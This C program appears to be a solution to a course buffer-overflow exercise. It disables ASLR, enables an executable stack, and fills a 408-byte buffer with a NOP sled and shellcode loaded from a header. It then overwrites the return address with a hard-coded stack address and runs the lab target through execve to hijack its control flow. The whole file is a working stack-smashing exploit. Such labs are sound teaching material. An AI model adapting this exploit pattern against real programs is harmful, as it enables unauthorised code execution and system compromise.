#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/personality.h>

/* Change to shellcode.h if you want a shell */
#include "shellcode.h"
#define TARGET "../targets/target1"
#define BUFLEN 400

int main(void)
{
  /* Setup code to make sure your target runs without ASLR and has an
     executable stack. Don't change this.*/
  personality(ADDR_NO_RANDOMIZE |READ_IMPLIES_EXEC);

  char *args[3];
  char *env[1];

  char buf[BUFLEN + 9] = {0};

  memset(buf, 0x90, BUFLEN + 8);
  memcpy(buf, shellcode, sizeof(shellcode)-1);

  *(unsigned int *)(buf + BUFLEN + 4) = 0xffffdafc;

  args[0] = TARGET;
  args[1] = buf;
  args[2] = NULL;
  env[0] = NULL;

  if (0 > execve(TARGET, args, env))
    perror("execve failed");

  return 0;
}
